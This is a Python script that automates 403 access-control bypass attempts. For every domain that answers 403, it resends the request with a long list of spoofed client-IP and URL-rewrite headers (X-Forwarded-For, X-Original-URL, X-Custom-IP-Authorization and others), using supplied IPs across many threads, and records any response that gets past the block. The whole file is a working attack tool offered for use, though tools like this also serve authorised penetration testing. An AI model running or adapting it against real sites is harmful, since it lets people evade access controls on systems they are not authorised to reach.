import concurrent.futures
import requests
import argparse
from tqdm import tqdm
import threading
requests.packages.urllib3.disable_warnings()

# Defining header variables
header_list = [
    "Access-Control-Allow-Origin", "Base-Url", "CF-Connecting-IP",
    "CF-Connecting_IP", "Client-IP", "Cluster-Client-IP",
    "Destination", "From", "Http-Url", "Origin",
    "Profile", "Proxy", "Proxy-Authenticate",
    "Proxy-Authorization", "Proxy-Client-IP", "Proxy-Host",
    "Proxy-Http", "Proxy-Url", "Real-Ip", "Redirect", "Referer",
    "Referrer", "Request-Uri", "Server", "True-Client-IP", "Uri",
    "Url", "WL-Proxy-Client-IP", "x-amz-website-redirect-location",
    "X-Arbitrary", "X-Client-Ip", "X-Client-IP", "X-Custom-IP-Authorization",
    "X-Custom-IP-Authorization..;/", "x-Envoy-external-adress",
    "x-envoy-internal", "x-envoy-original-dst-host", "X-Forwarded",
    "X-Forwarded-Authorization", "X-Forwarded-By", "x-forwarded-client-cert",
    "X-Forwarded-For", "X-Forwarded-For-Original", "X-Forwarded-Host",
    "X-Forwarded-Proto", "X-Forwarded-Server", "X-Forwarder-For", "X-Forward-For",
    "X-Host", "X-Http-Destinationurl", "X-HTTP-DestinationURL", "X-Http-Host-Override",
    "X-Ip", "X-OReferrer", "X-Original-Host", "X-Originally-Forwarded-For",
    "X-Original-Remote-Addr", "X-Original-Url", "X-Original-URL", "X-Originating-",
    "X-Originating-Ip", "X-Originating-IP", "X-Proxy-Url", "X-Proxy-URL",
    "X-ProxyUser-Ip", "X-Real-Ip", "X-Remote-Addr", "X-Remote-IP",
    "X-Rewrite-Url", "X-Rewrite-URL", "X-WAP-Profile"
]

# Global variable to control shutdown
shutdown_flag = threading.Event()

# Function to parse command line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="403 bypass test using HTTP headers and IPs")
    parser.add_argument('-i', '--ips', type=str, required=True, help="File containing a list of IPs")
    parser.add_argument('-d', '--domains', type=str, required=True, help="File containing a list of domains")
    parser.add_argument('-o', '--output', type=str, help="File to save the bypass results (optional)")
    parser.add_argument('-t', '--threads', type=int, default=5, help="Number of threads to use (default is 5)")
    return parser.parse_args()

# Function to read file and return a list of lines
def read_file(file_path):
    with open(file_path, "r", encoding='utf-8') as file:
        return [line.rstrip('\n') for line in file]

# Function to write results to an output file (only when the test is finished)
def write_results_to_file(results, output_file):
    if results and output_file:
        with open(output_file, "w") as file:
            for domain, status_code, header, ip in results:
                file.write(f"[STATUS {status_code}] Bypass: {domain} Header: {header} IP: {ip}\n")

# Function that performs the test for each header and IP
def test_bypass(header, ip, domain):
    session = requests.Session()
    try:
        # Check if shutdown has been initiated
        if shutdown_flag.is_set():
            return None
        
        # Making the request with a concise timeout
        response_403 = session.head(domain, timeout=5, verify=False, allow_redirects=False)
        
        if response_403.status_code == 403:
            if shutdown_flag.is_set():
                return None
            
            response = session.head(domain, headers={header: ip}, timeout=5, verify=False)
            http_code = response.status_code
            if http_code in [200, 301, 302, 401, 404]:
                return (domain, http_code, header, ip)
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.RequestException):
        # Handle exceptions but do not let this block frozen the thread
        pass
    finally:
        session.close()
    
    return None

# Function that creates threads to test in parallel
def start_tests(ips_list, domains_list, header_list, num_threads):
    results = []
    total_tests = len(header_list) * len(ips_list) * len(domains_list)
    
    # Create a ThreadPoolExecutor to manage threads
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        future_to_result = {
            executor.submit(test_bypass, header, ip, domain): (domain, header, ip)
            for ip in ips_list for header in header_list for domain in domains_list
        }
        
        with tqdm(total=total_tests, desc="Running") as pbar:
            for future in concurrent.futures.as_completed(future_to_result):
                result = future.result()
                if result is not None:
                    results.append(result)
                pbar.update(1)
    return results

# Main function
def main():
    try:
        print("[+] Testing 403 bypass for multiple domains with different headers and IPs")
        args = parse_arguments()
        ips_list = read_file(args.ips)
        domains_list = read_file(args.domains)
        output_file = args.output
        num_threads = args.threads
        
        results = start_tests(ips_list, domains_list, header_list, num_threads)
        print(f"[!] Total bypass found: {len(results)}\n")
        write_results_to_file(results, output_file)
    except KeyboardInterrupt:
        shutdown_flag.set()  # Set the shutdown flag to stop all threads gracefully
        print("\n[!] Execution interrupted by user. Exiting...")
        
if __name__ == "__main__":
    main()
